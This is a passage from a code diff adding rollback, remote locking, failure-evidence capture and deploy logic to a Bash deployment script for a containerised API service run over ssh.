+      warn "edge state after failed flip is unresolved for ${env}; candidate ${next_unit} left running. Recovery: $(rollback_command_hint "${env}")"
+    fi
+    return 1
+  fi
+  ACX_TRAFFIC_FLIPPED=1
+  if ! enable_cutover_candidate "$env"; then
+    warn "could not enable ${next_unit} after traffic flip; reverting to keep reboot-safe routing"
+    if flip_edge_alias "$env" canonical; then
+      ACX_TRAFFIC_FLIPPED=0
+      ACX_CUTOVER_COMMITTED=1
+      if ! abort_cutover_candidate "$env"; then
+        warn "cutover candidate cleanup failed after enablement rollback"
+      fi
+    else
+      warn "canonical flip failed; leaving candidate ${next_unit} serving"
+    fi
+    return 1
+  fi
+  if ! curl --fail --silent --show-error --max-time 10 "$(env_to_health_url "$env")" >/dev/null; then
+    warn "public health failed after rollback traffic flip; reverting to ${unit}"
+    if flip_edge_alias "$env" canonical; then
+      ACX_TRAFFIC_FLIPPED=0
+      ACX_CUTOVER_COMMITTED=1
+      if ! abort_cutover_candidate "$env"; then
+        warn "rollback candidate cleanup failed after public health revert"
+      fi
+    else
+      warn "canonical flip failed; leaving rollback candidate ${next_unit} serving"
+    fi
+    return 1
+  fi
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  recognition_edge_assert_if_active || return 75
+  ACX_LIVE_DISRUPTED=1
+  if ! recognition_edge_command "sudo systemctl restart $(remote_quote "${unit}")"; then
+    warn "rollback restart failed; traffic remains on ${next_unit} serving the rollback image"
+    return 1
+  fi
+  if ! probe_canonical_api_health "$env"; then
+    warn "canonical ${unit} did not become healthy after rollback restart; traffic remains on ${next_unit}"
+    return 1
+  fi
+  if ! verify_running_image_digest "$env" "${ACX_ROLLBACK_DIGEST_REF}"; then
+    warn "canonical ${unit} is running the wrong rollback image; traffic remains on ${next_unit}"
+    return 1
+  fi
+  if ! flip_edge_alias "$env" canonical; then
+    warn "could not flip traffic back to ${unit}; traffic remains on ${next_unit}"
+    return 1
+  fi
+  ACX_TRAFFIC_FLIPPED=0
+  ACX_CUTOVER_COMMITTED=1
+  if ! abort_cutover_candidate "$env"; then
+    warn "cutover candidate cleanup failed after successful canonical flip"
+    return 1
+  fi
+  ACX_LIVE_DISRUPTED=0
+  return 0
+}
+
+restore_runtime_and_edge() {
+  recognition_edge_assert_if_active || return 75
+  local env="$1" restart_runtime="${2:-0}" unit inspect_timeout rollback_sha
+  local traffic_side="" skip_edge_cleanup=0 inflight_rc=0
+  inspect_timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
+  # Check ownership at the sticky resource before any runtime compensation.
+  # This also keeps sticky cleanup independent of downstream topology failures.
+  local sticky_status=0
+  restore_prior_image_repo_env || sticky_status=$?
+  if ((sticky_status != 0)); then
+    warn "could not restore prior ACX_IMAGE_REPO before runtime rollback"
+    return "${sticky_status}"
+  fi
+  if ! restore_topology_backups "${env}"; then
+    warn "could not restore compose/unit topology from .bak before rollback"
+    return 1
+  fi
+  if [[ "${restart_runtime}" == "1" ]]; then
+    if [[ "${ACX_TRAFFIC_FLIPPED:-0}" == "1" ]]; then
+      traffic_side="next"
+    else
+      cutover_inflight_present "${env}" || inflight_rc=$?
+      case "${inflight_rc}" in
+        0)
+          traffic_side="next"
+          ACX_TRAFFIC_FLIPPED=1
+          ;;
+        1) traffic_side="canonical" ;;
+        *)
+          warn "rollback cannot establish which unit serves ${env}; refusing to restart"
+          return 1
+          ;;
+      esac
+    fi
+    unit="$(env_to_unit "${env}")"
+    if [[ "${traffic_side}" == "canonical" ]]; then
+      if ! restore_edge_backups "${env}"; then
+        if [[ "${ACX_TRAFFIC_FLIPPED:-0}" == "1" ]]; then
+          warn "edge restore failed while traffic remains on ${env}-next; leaving candidate serving. Recovery: $(rollback_command_hint "${env}")"
+          return 1
+        fi
+        warn "could not restore Caddy edge topology from .bak"
+        return 1
+      fi
+      assert_remote_env_image_tag "$env"
+      if ! staged_rollback_runtime "${env}"; then
+        return 1
+      fi
+      skip_edge_cleanup=1
+    else
+      assert_remote_env_image_tag "$env"
+      recognition_edge_assert_if_active || return 75
+      if ! recognition_edge_command "sudo systemctl restart $(remote_quote "${unit}")"; then
+        warn "could not restart ${unit} on the restored image"
+        return 1
+      fi
+      if ! probe_canonical_api_health "${env}" ||
+        ! verify_running_image_digest "${env}" "${ACX_ROLLBACK_DIGEST_REF}"; then
+        warn "canonical ${unit} is not healthy on the rollback image; traffic remains on ${env}-next. Recovery: $(rollback_command_hint "${env}")"
+        return 1
+      fi
+    fi
+  fi
+  if ((skip_edge_cleanup == 0)); then
+    if ! restore_edge_backups "${env}"; then
+      if [[ "${ACX_TRAFFIC_FLIPPED:-0}" == "1" ]]; then
+        warn "edge restore failed while traffic remains on ${env}-next; leaving candidate serving. Recovery: $(rollback_command_hint "${env}")"
+        return 1
+      fi
+      warn "could not restore Caddy edge topology from .bak"
+      return 1
+    fi
+    if [[ "${ACX_TRAFFIC_FLIPPED:-0}" == "1" ]]; then
+      warn "edge restore left traffic on ${env}-next; refusing to drain candidate. Recovery: $(rollback_command_hint "${env}")"
+      return 1
+    fi
+    if ! abort_cutover_candidate "${env}"; then
+      warn "could not drain cutover candidate after restoring canonical topology"
+      return 1
+    fi
+  fi
+  if [[ "${restart_runtime}" == "1" ]]; then
+    if ! verify_restored_runtime "${env}" "${ACX_ROLLBACK_DIGEST_REF}"; then
+      warn "rollback restart completed but healthy serving state was not observed"
+      return 1
+    fi
+    if rollback_sha="$(remote_image_commit_sha "${ACX_ROLLBACK_DIGEST_REF}")"; then
+      if ! write_deployed_release_receipt "${env}" "${rollback_sha}" "${ACX_ROLLBACK_DIGEST_REF}"; then
+        warn "RELEASE RECEIPT WRITE FAILED for ${env}; standalone verify will fail closed until the next successful deploy"
+      fi
+    else
+      warn "ROLLBACK RELEASE SHA UNKNOWN for ${env}; skipping release receipt write for ${ACX_ROLLBACK_DIGEST_REF}"
+    fi
+  fi
+  return 0
+}
+
+# Restore both the registry env tag and the VM's cached tag to the digest that
+# was serving before this transaction. This closes the latent-rollout window
+# when digest staging succeeds but a later repair/restart/verify step fails.
+with_shared_tag_lock() {
+  local tag="$1"
+  shift
+  local timeout lock_path holder_pid holder_stdin_pid holder_out holder_err holder_diag rc=0 waited=0
+  assert_safe_shell_token "image tag" "${tag}"
+  if [[ "${ACX_ENV_TAG_LOCK_HELD:-}" == "${tag}" ]]; then
+    "$@"
+    return
+  fi
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+  lock_path="${ACX_DEPLOY_BACKUP_ROOT}/locks/tag-${tag}.lock"
+  holder_out="$(mktemp "${TMPDIR:-/tmp}/acx-tag-lock.XXXXXX")" || return 1
+  mkfifo "${holder_out}.stdin" || {
+    rm -f "${holder_out}"
+    return 1
+  }
+  # The remote cat holds the flock until its stdin closes: keep the writer
+  # alive for the whole wrapped command, not just the acquire timeout.
+  (while kill -0 "$$" 2>/dev/null; do sleep 1 >/dev/null; done) </dev/null >"${holder_out}.stdin" 2>/dev/null &
+  holder_stdin_pid=$!
+  ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+    -o ServerAliveInterval=5 -o ServerAliveCountMax=2 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "sudo install -d -m 700 $(remote_quote "${ACX_DEPLOY_BACKUP_ROOT}/locks") && sudo flock -w ${timeout} $(remote_quote "${lock_path}") sh -c 'printf \"LOCKED\\n\"; exec cat >/dev/null'" \
+    <"${holder_out}.stdin" >"${holder_out}" 2>"${holder_out}.err" &
+  holder_pid=$!
+  while ! grep -q '^LOCKED$' "${holder_out}" 2>/dev/null; do
+    if ! kill -0 "${holder_pid}" 2>/dev/null; then
+      wait "${holder_pid}" || true
+      holder_err="$(sed -n '1,5p' "${holder_out}.err" 2>/dev/null || true)"
+      holder_diag="${holder_err}"
+      if [[ -n "${holder_err}" ]] && declare -F sanitize_deploy_diagnostic >/dev/null 2>&1; then
+        holder_diag="$(printf '%s\n' "${holder_err}" | sanitize_deploy_diagnostic)" || holder_diag="${holder_err}"
+      fi
+      warn "could not acquire shared env-tag lock for ${tag}; holder stderr (first 5 lines): ${holder_diag:-<empty>}"
+      kill "${holder_stdin_pid}" 2>/dev/null || true
+      wait "${holder_stdin_pid}" 2>/dev/null || true
+      rm -f "${holder_out}" "${holder_out}.err" "${holder_out}.stdin"
+      return 1
+    fi
+    if ((waited >= timeout)); then
+      holder_err="$(sed -n '1,5p' "${holder_out}.err" 2>/dev/null || true)"
+      holder_diag="${holder_err}"
+      if [[ -n "${holder_err}" ]] && declare -F sanitize_deploy_diagnostic >/dev/null 2>&1; then
+        holder_diag="$(printf '%s\n' "${holder_err}" | sanitize_deploy_diagnostic)" || holder_diag="${holder_err}"
+      fi
+      warn "timed out acquiring shared env-tag lock for ${tag}; holder stderr (first 5 lines): ${holder_diag:-<empty>}"
+      kill "${holder_pid}" 2>/dev/null || true
+      wait "${holder_pid}" 2>/dev/null || true
+      kill "${holder_stdin_pid}" 2>/dev/null || true
+      wait "${holder_stdin_pid}" 2>/dev/null || true
+      rm -f "${holder_out}" "${holder_out}.err" "${holder_out}.stdin"
+      return 1
+    fi
+    sleep 1
+    waited=$((waited + 1))
+  done
+  ACX_ENV_TAG_LOCK_HELD="${tag}"
+  "$@" || rc=$?
+  ACX_ENV_TAG_LOCK_HELD=""
+  kill "${holder_pid}" 2>/dev/null || true
+  wait "${holder_pid}" 2>/dev/null || true
+  kill "${holder_stdin_pid}" 2>/dev/null || true
+  wait "${holder_stdin_pid}" 2>/dev/null || true
+  rm -f "${holder_out}" "${holder_out}.err" "${holder_out}.stdin"
+  return "${rc}"
+}
+
+restore_env_tag_to_rollback() {
+  recognition_edge_assert_if_active || return 75
+  local env restart_runtime rollback_base env_tag
+  if [[ "${1:-}" == "--locked" ]]; then
+    shift
+  else
+    env="$1"
+    restart_runtime="${2:-0}"
+    env_tag="$(env_to_tag "${env}")"
+    with_shared_tag_lock "${env_tag}" restore_env_tag_to_rollback --locked "${env}" "${restart_runtime}"
+    return
+  fi
+  env="$1"
+  restart_runtime="${2:-0}"
+  env_tag="$(env_to_tag "${env}")" || return 1
+  assert_rollback_fence "${env}" "${restart_runtime}" || return $?
+  restore_registry_env_tag "${env}" || return $?
+  restore_runtime_and_edge "${env}" "${restart_runtime}" || return $?
+  rollback_base="${ACX_ROLLBACK_IMAGE_BASE:-${ACX_ROLLBACK_DIGEST_REF%@sha256:*}}"
+  log "Restored ${rollback_base}:${env_tag} to ${ACX_ROLLBACK_DIGEST_REF}"
+}
+
+rollback_command_hint() {
+  local env="$1"
+  if [[ -n "${ACX_ROLLBACK_TAG:-}" ]]; then
+    printf '%s rollback %s %s' "$0" "${env}" "${ACX_ROLLBACK_TAG#rollback-}"
+  else
+    printf '%s rollback %s <rollback-id>' "$0" "${env}"
+  fi
+}
+
+do_rollback() {
+  local env="$1" rollback_id="$2" rollback_ref digest env_tag current_digest current_image_id rollback_image_id
+  env_to_unit "$env" >/dev/null || return 1
+  if [[ ! "${rollback_id}" =~ ^[a-f0-9]{12}$ ]]; then
+    fail "rollback id must be the 12-character digest prefix printed by a failed deployment"
+  fi
+  if is_prod_tier_env "${env}" && [[ "${CONFIRM:-}" != "PROMOTE" ]]; then
+    fail "Production rollback requires CONFIRM=PROMOTE"
+  fi
+  init_deploy_ocir_docker_config
+  preflight_ssh
+  if is_aura_env "$env"; then preflight_remote_face_pipeline_models "$env"; fi
+  preflight_remote_ocir_auth
+  deploy_env_lease acquire "${env}" || fail "deploy lease for ${env} unavailable; holder line: ${ACX_DEPLOY_LEASE_LAST_HOLDER:-unknown}; refusing rollback"
+  rollback_ref="${IMAGE_BASE}:rollback-${rollback_id}"
+  _pull_ref_remote "${rollback_ref}"
+  digest="$(remote_image_digest_ref "${rollback_ref}")" ||
+    fail "Rollback tag ${rollback_ref} could not be inspected"
+  if [[ ! "${digest}" =~ ^${IMAGE_BASE}@sha256:${rollback_id}[a-f0-9]{52}$ ]]; then
+    fail "Rollback tag ${rollback_ref} did not resolve to a valid digest"
+  fi
+  ACX_ROLLBACK_DIGEST_REF="${digest}"
+  ACX_ROLLBACK_IMAGE_BASE="${IMAGE_BASE}"
+  env_tag="$(env_to_tag "${env}")" || return 1
+  # Manual rollback has no build candidate, so snapshot the current registry
+  # generation and pass it through the same stale-tag fence as automatic
+  # compensation. An unreadable/empty mapping is unknown, never permission to
+  # overwrite the environment tag.
+  _pull_ref_remote "${IMAGE_BASE}:${env_tag}" ||
+    fail "Current ${IMAGE_BASE}:${env_tag} could not be pulled; refusing unfenced rollback"
+  current_digest="$(remote_image_digest_ref "${IMAGE_BASE}:${env_tag}")" ||
+    fail "Current ${IMAGE_BASE}:${env_tag} mapping could not be inspected; refusing unfenced rollback"
+  if [[ ! "${current_digest}" =~ ^${IMAGE_BASE}@sha256:[a-f0-9]{64}$ ]]; then
+    fail "Current ${IMAGE_BASE}:${env_tag} mapping is invalid; refusing unfenced rollback"
+  fi
+  rollback_image_id="$(remote_image_id_for_digest "${ACX_ROLLBACK_DIGEST_REF}")" ||
+    fail "Rollback ${rollback_ref} immutable image could not be inspected; refusing unfenced rollback"
+  current_image_id="$(remote_image_id_for_digest "${current_digest}")" ||
+    fail "Current ${IMAGE_BASE}:${env_tag} immutable image could not be inspected; refusing unfenced rollback"
+  # systemd ExecStop uses compose stop, so the runtime may still be the fenced
+  # rollback artifact while the registry tag remains on the generation an
+  # operator is replacing. Accept only the current registry image or the
+  # explicitly selected rollback image; never infer ownership from age alone.
+  capture_prior_runtime_identity "${env}" "${current_image_id},${rollback_image_id}" 1 ||
+    fail "Current ${env} runtime generation could not be captured; refusing unfenced rollback"
+  ACX_CANDIDATE_DIGEST_REF="${current_digest}"
+  if ! deploy_env_lease renew "${env}"; then
+    fail "deploy lease for ${env} lost to ${ACX_DEPLOY_LEASE_LAST_HOLDER:-another transaction}; refusing rollback"
+  fi
+  recognition_edge_begin "$env" || fail "Rollback shared edge ownership unavailable"
+  restore_env_tag_to_rollback "${env}" 1 ||
+    rollback_failure "$?" "Rollback failed; ${IMAGE_BASE}:${env_tag} outcome is unknown"
+  recognition_edge_finish || fail "Rollback edge completion failed; journal retained"
+  # restore_env_tag_to_rollback already requires both /health and immutable
+  # image-ID evidence. GIT_REF may intentionally differ from the old rollback
+  # commit, so a current-GIT_REF do_verify here would reject a healthy rollback.
+}
+
+# Capture the live failure state before automatic rollback replaces the serving
+# container. Phase selects the probe set:
+#   pre_candidate — push/tag failed before the candidate container started.
+#                   Skip HTTP probes of the PRIOR image; collect scoped
+#                   docker ps / compose state and a 'candidate never started' line.
+#   post_restart  — systemctl restart was issued. Keep api logs; skip /health
+#                   and /ready (those may still be the prior image).
+#   candidate     — the candidate ran (verify failed). Probe loopback Caddy
+#                   /health + /ready (host port 443, env Host/SNI) and api logs.
+# Evidence is diagnostic only: every remote call is deadline-bounded and a
+# failed probe is warned about without blocking the rollback that follows.
+capture_failure_evidence() {
+  local env="$1" phase="${2:-candidate}"
+  local remote_dir compose_files remote_dir_q timeout evidence=""
+  local health_url ready_url health_host health_url_q ready_url_q health_host_q
+  local cid cid_q cid_raw cid_err cid_trimmed
+  remote_dir="$(env_to_remote_dir "${env}")" || return 1
+  compose_files="$(env_to_compose_files "${env}")" || return 1
+  remote_dir_q="$(remote_quote "${remote_dir}")"
+  log "failure evidence compose project: grep -m1 ^COMPOSE_PROJECT_NAME= ${remote_dir}/.env (fallback acx-${env})"
+  timeout="$(validated_deadline ACX_EVIDENCE_TIMEOUT 30)" || {
+    warn "failure evidence skipped for ${env}; ACX_EVIDENCE_TIMEOUT must be a positive integer (got: ${ACX_EVIDENCE_TIMEOUT:-})"
+    return 0
+  }
+
+  case "${phase}" in
+    pre_candidate | post_restart | candidate) ;;
+    *)
+      warn "failure evidence unknown phase '${phase}' for ${env}; skipping HTTP probes of the prior image"
+      phase="pre_candidate"
+      ;;
+  esac
+
+  if [[ "${phase}" == "pre_candidate" || "${phase}" == "post_restart" ]]; then
+    if [[ "${phase}" == "pre_candidate" ]]; then
+      printf '%s\n' "candidate never started" >&2
+    fi
+    printf 'environment: %s\n' "${env}" >&2
+    printf '%s\n' "--- evidence: docker ps / compose ---" >&2
+    evidence=""
+    # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
+    if ! evidence="$(run_with_deadline "${timeout}" "failure evidence compose/ps for ${env}" \
+      ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "cd ${remote_dir_q} && compose_project=\$(grep -m1 '^COMPOSE_PROJECT_NAME=' ${remote_dir_q}/.env | cut -d= -f2- | tr -d \"\\\"' \") && compose_project=\${compose_project:-acx-${env}} && echo compose_project=\$compose_project && docker compose ${compose_files} ps; docker ps --filter label=com.docker.compose.project=\"\$compose_project\" --format '{{.ID}} {{.Names}} {{.Status}}'" 2>&1)"; then
+      warn "failure evidence compose/ps capture failed for ${env}; continuing with rollback"
+    fi
+    emit_sanitized_evidence "${evidence}"
+    if [[ "${phase}" == "pre_candidate" ]]; then
+      return 0
+    fi
+  fi
+
+  if [[ "${phase}" == "candidate" ]]; then
+    health_url="$(env_to_health_url "${env}")"
+    ready_url="$(env_to_ready_url "${env}")"
+    health_host="${health_url#https://}"
+    health_host="${health_host%%/*}"
+    health_url_q="$(remote_quote "${health_url}")"
+    ready_url_q="$(remote_quote "${ready_url}")"
+    health_host_q="$(remote_quote "${health_host}")"
+
+    printf '%s\n' "--- evidence: /health ---" >&2
+    printf 'environment: %s\n' "${env}" >&2
+    evidence=""
+    if ! evidence="$(run_with_deadline "${timeout}" "failure evidence /health for ${env}" \
+      ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "curl -sS --max-time 10 --resolve ${health_host_q}:443:127.0.0.1 --write-out '\\nHTTP_CODE=%{http_code}' ${health_url_q}" 2>&1)"; then
+      warn "failure evidence /health probe failed for ${env}; continuing with rollback"
+    fi
+    emit_sanitized_evidence "${evidence}"
+
+    printf '%s\n' "--- evidence: /ready ---" >&2
+    printf 'environment: %s\n' "${env}" >&2
+    evidence=""
+    if ! evidence="$(run_with_deadline "${timeout}" "failure evidence /ready for ${env}" \
+      ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "curl -sS --max-time 10 --resolve ${health_host_q}:443:127.0.0.1 --write-out '\\nHTTP_CODE=%{http_code}' ${ready_url_q}" 2>&1)"; then
+      warn "failure evidence /ready probe failed for ${env}; continuing with rollback"
+    fi
+    emit_sanitized_evidence "${evidence}"
+  fi
+
+  printf '%s\n' "--- evidence: api container logs ---" >&2
+  printf 'environment: %s\n' "${env}" >&2
+  evidence=""
+  cid=""
+  cid_err="$(mktemp)"
+  # Keep ssh stderr off the cid parse: a trailing host-key/motd/compose warning
+  # must not replace a valid hex id (and skip docker logs). Sanitize stderr so
+  # secrets still never reach the log unprefixed.
+  # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
+  if ! cid="$(run_with_deadline "${timeout}" "failure evidence api cid for ${env}" \
+    ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+    -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "cd ${remote_dir_q} && docker compose ${compose_files} ps -q api 2>/dev/null" \
+    2>"${cid_err}")"; then
+    warn "failure evidence api cid capture failed for ${env}; continuing with rollback"
+  fi
+  if [[ -s "${cid_err}" ]]; then
+    if ! sanitize_deploy_diagnostic <"${cid_err}" >&2; then
+      echo "diagnostic: cid capture stderr unavailable" >&2
+    fi
+  fi
+  rm -f "${cid_err}"
+  cid_raw="${cid}"
+  cid="$(printf '%s\n' "${cid}" | awk '{ sub(/\r$/,""); gsub(/^[ \t]+|[ \t]+$/,""); } /^[0-9a-fA-F]{64}$/ { id=tolower($0) } END { if (id) print id }')"
+  cid_trimmed="$(printf '%s' "${cid_raw}" | tr -d '[:space:]')"
+  if [[ -n "${cid}" && "${cid}" =~ ^[0-9a-f]{64}$ ]]; then
+    cid_q="$(remote_quote "${cid}")"
+    if ! evidence="$(run_with_deadline "${timeout}" "failure evidence api logs for ${env}" \
+      ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
+      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "docker logs --tail 80 ${cid_q}" 2>&1)"; then
+      warn "failure evidence api log capture failed for ${env}; continuing with rollback"
+    fi
+  elif [[ -n "${cid_trimmed}" ]]; then
+    if ! printf '%s\n' "unexpected container id output: ${cid_raw}" | sanitize_deploy_diagnostic >&2; then
+      echo "diagnostic: unexpected container id output unavailable" >&2
+    fi
+    evidence=""
+  else
+    evidence="no api container"
+  fi
+  emit_sanitized_evidence "${evidence}"
+  return 0
+}
+
+# Shared by do_deploy / do_promote. ACX_VERIFY_OPTIONAL may warn only after a
+# successful runtime rollback; a failed rollback stays fail-closed.
+handle_failed_verification() {
+  local env="$1" label="$2"
+  local rollback_ok=0 rollback_status=0
+  if ! deploy_env_lease renew "${env}"; then
+    skip_compensation_after_lease_loss "${env}"
+    fail "stopping without compensation after deploy lease loss for ${env}"
+  fi
+  ACX_DEPLOY_PHASE=compensating
+  capture_failure_evidence "$env" candidate || warn "automatic failure evidence capture failed; continuing with rollback"
+  if restore_env_tag_to_rollback "$env" 1; then
+    rollback_ok=1
+    ACX_DEPLOY_PHASE=""
+  else
+    rollback_status=$?
+    rollback_ok=0
+    warn "automatic runtime rollback failed; run: $(rollback_command_hint "$env")"
+  fi
+  if [[ "$rollback_ok" == "1" && "${ACX_VERIFY_OPTIONAL:-0}" == "1" ]]; then
+    warn "Verify failed but ACX_VERIFY_OPTIONAL=1; previous image restored. Recovery: $(rollback_command_hint "$env")"
+  elif [[ "$rollback_ok" == "1" ]]; then
+    fail "${label} verification failed; previous image restored where possible. Recovery: $(rollback_command_hint "$env")"
+  else
+    rollback_failure "${rollback_status}" "${label} verification failed AND automatic rollback failed; runtime state unknown. Recovery: $(rollback_command_hint "$env")"
+  fi
+}
+
+report_verify_expectation_error() {
+  local env="$1" label="$2"
+  ACX_DEPLOY_PHASE=compensating
+  capture_failure_evidence "$env" candidate || warn "automatic failure evidence capture failed; continuing without rollback"
+  printf '%s\n' "VERIFY EXPECTATION ERROR: ${label} left the healthy candidate serving on ${env}; no rollback was performed. Check the image's GIT_COMMIT_SHA build-arg against DEPLOY_SHA=${DEPLOY_SHA}. Manual rollback if needed: $(rollback_command_hint "$env")" >&2
+  ACX_DEPLOY_PHASE=""
+  exit 2
+}
+
+#---------------------------------------------------------------- deploy
+# Shared selected-env ship. Completion is a required positional
+# (aggregate|scoped), never an inherited variable and never a public
+# do_deploy argument (RLSE-03, AGT-06, DATA-13).
+_ship_selected_env() {
+  local env="$1"
+  local completion="$2"
+  local tag sha restart_runtime verify_status pending_interrupt
+  local ship_remote_build="${REMOTE_BUILD}"
+
+  case "${completion}" in
+    aggregate | scoped) ;;
+    *) fail "internal: _ship_selected_env completion must be aggregate or scoped (got: ${completion:-empty})" ;;
+  esac
+
+  pin_deploy_sha
+
+  init_deploy_ocir_docker_config
+
+  tag="$(env_to_tag "$env")" || return 1
+  sha="${DEPLOY_SHA}"
+
+  if is_prod_tier_env "$env" && [[ "${CONFIRM:-}" != "PROMOTE" ]]; then
+    if [[ "${completion}" == "scoped" ]]; then
+      fail "Production prepare-producer requires CONFIRM=PROMOTE. Re-run: CONFIRM=PROMOTE $0 prepare-producer ${env}"
+    fi
+    fail "Production deploy requires CONFIRM=PROMOTE. Re-run: CONFIRM=PROMOTE $0 deploy prod"
+  fi
+
+  preflight_ssh
+  preflight_remote_face_pipeline_models "$env"
+  preflight_git_clean "$env"
+  preflight_branch_synced "$env"
+  preflight_env_manifest "$env"
+
+  # Snapshot and publish the previous-good digest before building the candidate.
+  # Remote builds only tag the SHA; the environment tag changes after smoke.
+  preflight_remote_ocir_auth
+  deploy_env_lease acquire "${env}" || fail "deploy lease for ${env} unavailable; holder line: ${ACX_DEPLOY_LEASE_LAST_HOLDER:-unknown}; refusing to preserve the rollback tag"
+  preserve_rollback_tag "$env"
+  if [[ -n "${ACX_ROLLBACK_DIGEST_REF:-}" ]]; then
+    if ! capture_prior_runtime_identity "$env" "${ACX_PRIOR_IMAGE_ID:-}" 0; then
+      warn "ROLLBACK NOT PRESERVED: prior api container identity could not be captured; runtime rollback will fail closed"
+    fi
+  fi
+
+  if [[ "${REMOTE_BUILD}" == "1" ]]; then
+    log "Mode: remote-build (${SSH_TARGET}, no local docker required)"
+    if ! deploy_env_lease renew "${env}"; then
+      skip_compensation_after_lease_loss "${env}"
+      fail "stopping before remote build after deploy lease loss for ${env}"
+    fi
+    do_build_remote "$tag"
+  else
+    do_build "$tag"
+  fi
+
+  # Push :SHA first, gate on the boot smoke, and only then promote the env tag
+  # (e.g. :latest) so a failed smoke never poisons the promotion tag in OCIR.
+  do_push_sha
+  ACX_DEPLOY_ENV="$env"
+  if ! deploy_env_lease renew "${env}"; then
+    ACX_DEPLOY_PHASE=""
+    ACX_DEPLOY_LEASE_ENV=""
+    fail "deploy lease for ${env} lost to ${ACX_DEPLOY_LEASE_LAST_HOLDER:-another transaction}; stopping without compensation because another transaction owns ${env}. Inspect: $(rollback_command_hint "${env}")"
+  fi
+  promote_gate "$env" "${ACX_CANDIDATE_DIGEST_REF}"
+  if ! deploy_env_lease renew "${env}"; then
+    ACX_DEPLOY_PHASE=""
+    ACX_DEPLOY_LEASE_ENV=""
+    fail "deploy lease for ${env} lost to ${ACX_DEPLOY_LEASE_LAST_HOLDER:-another transaction}; stopping without compensation because another transaction owns ${env}. Inspect: $(rollback_command_hint "${env}")"
+  fi
+  # S2-A-06: if tag promotion fails after ship, restore prior sticky repo.
+  ACX_DEPLOY_TAG_PUSH_ACTIVE=1
+  if do_push_tag "$tag" "${ACX_CANDIDATE_DIGEST_REF}"; then
+    ACX_DEPLOY_PHASE=tag_promoted
+    ACX_DEPLOY_TAG_PUSH_ACTIVE=0
+    if [[ -n "${ACX_DEPLOY_PENDING_INTERRUPT}" ]]; then
+      pending_interrupt="${ACX_DEPLOY_PENDING_INTERRUPT}"
+      ACX_DEPLOY_PENDING_INTERRUPT=""
+      deploy_interrupt_cleanup "${pending_interrupt}"
+    fi
+  else
+    ACX_DEPLOY_PHASE=compensating
+    ACX_DEPLOY_TAG_PUSH_ACTIVE=0
+    if ! deploy_env_lease renew "${env}"; then
+      skip_compensation_after_lease_loss "${env}"
+      fail "stopping without compensation after deploy lease loss for ${env}"
+    fi
+    capture_failure_evidence "$env" pre_candidate || warn "automatic failure evidence capture failed; continuing with rollback"
+    local rollback_status=0 repo_restore_status=0
+    if restore_env_tag_to_rollback "$env" 0; then
+      :
+    else
+      rollback_status=$?
+      warn "automatic env-tag restore failed; refusing further runtime compensation; run: $(rollback_command_hint "$env")"
+    fi
+    if ((rollback_status != 75)); then
+      restore_prior_image_repo_env || {
+        repo_restore_status=$?
+        warn "prior sticky repository restore failed"
+      }
+    fi
+    if ((rollback_status == 0 && repo_restore_status == 0)); then
+      ACX_DEPLOY_PHASE=""
+    fi
+    if [[ -n "${ACX_DEPLOY_PENDING_INTERRUPT}" ]]; then
+      pending_interrupt="${ACX_DEPLOY_PENDING_INTERRUPT}"
+      ACX_DEPLOY_PENDING_INTERRUPT=""
+      deploy_interrupt_cleanup "${pending_interrupt}"
+    fi
+    rollback_failure "${rollback_status}" "Push of env tag failed after shipping ACX_IMAGE_REPO. Recovery: $(rollback_command_hint "$env")"
+  fi
+
+  if ! deploy_env_lease renew "${env}"; then
+    ACX_DEPLOY_PHASE=""
+    ACX_DEPLOY_LEASE_ENV=""
+    fail "deploy lease for ${env} lost to ${ACX_DEPLOY_LEASE_LAST_HOLDER:-another transaction}; stopping without compensation because another transaction owns ${env}. Inspect: $(rollback_command_hint "${env}")"
+  fi
+  if ! do_restart "$env" "${ACX_CANDIDATE_DIGEST_REF}"; then
+    ACX_DEPLOY_PHASE=compensating
+    if ! deploy_env_lease renew "${env}"; then
+      skip_compensation_after_lease_loss "${env}"
+      fail "stopping without compensation after deploy lease loss for ${env}"
+    fi
+    capture_failure_evidence "$env" "${ACX_RESTART_EVIDENCE_PHASE:-pre_candidate}" || warn "automatic failure evidence capture failed; continuing with rollback"
+    restart_runtime="$(cutover_failure_restart_runtime)"
+    local rollback_status=0 repo_restore_status=0
+    if restore_env_tag_to_rollback "$env" "${restart_runtime}"; then
+      :
+    else
+      rollback_status=$?
+      warn "automatic env-tag restore failed; refusing further runtime compensation; run: $(rollback_command_hint "$env")"
+    fi
+    if ((rollback_status != 75)); then
+      restore_prior_image_repo_env || {
+        repo_restore_status=$?
+        warn "prior sticky repository restore failed"
+      }
+    fi
+    if ((rollback_status == 0 && repo_restore_status == 0)); then
+      ACX_DEPLOY_PHASE=""
+    fi
+    rollback_failure "${rollback_status}" "Restart failed; the previous env tag was restored where possible. Recovery: $(rollback_command_hint "$env")"
+  fi
+  ACX_DEPLOY_PHASE=restarted
+
+  if [[ "${completion}" == "aggregate" ]]; then
+    log "Deploy submitted. Verifying..."
+    # S2-A-04: deploy path uses local resolve as authority (not the remote .env
+    # we just wrote — that comparison would be tautological).
